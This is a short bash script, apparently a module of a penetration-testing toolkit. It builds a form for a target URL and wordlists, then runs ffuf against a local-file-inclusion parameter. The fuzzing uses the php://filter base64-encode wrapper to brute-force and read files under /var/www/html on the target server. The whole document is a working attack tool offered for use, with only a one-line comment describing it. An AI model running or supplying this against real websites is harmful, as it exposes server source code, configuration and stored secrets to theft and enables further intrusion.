#!/bin/bash

: '
fuzz for files in var www html with php filter base64
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
WEBSITE_FIELD=$(form_item "website" "website")
DIR_WORDLIST_FIELD=$(form_item "directory wordlist" "directory_wordlist" "/usr/share/seclists/Discovery/Web-Content/common.txt")
FILE_WORDLIST_FIELD=$(form_item "file wordlist" "file_wordlist" "/usr/share/seclists/Discovery/Web-Content/common.txt")
EXT_WORDLIST_FIELD=$(form_item "extension wordlist" "extension_wordlist" "/usr/share/wordlists/seclists/Discovery/Web-Content/web-extensions.txt")
PATH_PREFIX_FIELD=$(form_item "path prefix" "path_prefix" "/var/www/html/")

# Generate GUI form
generate_form "${WEBSITE_FIELD}" "${DIR_WORDLIST_FIELD}" "${FILE_WORDLIST_FIELD}" "${EXT_WORDLIST_FIELD}" "${PATH_PREFIX_FIELD}"

WEBSITE=${form_data["website"]}
DIR_WORDLIST=${form_data["directory_wordlist"]}
FILE_WORDLIST=${form_data["file_wordlist"]}
EXT_WORDLIST=${form_data["extension_wordlist"]}
PATH_PREFIX=${form_data["path_prefix"]}

execute_command "ffuf -w ${DIR_WORDLIST}:DIR -w ${FILE_WORDLIST}:FILE -w ${EXT_WORDLIST}:EXT -u '${WEBSITE}php://filter/read=convert.base64-encode/resource=${PATH_PREFIX}DIR/FILE.EXT' -fs 0"
create_new_line
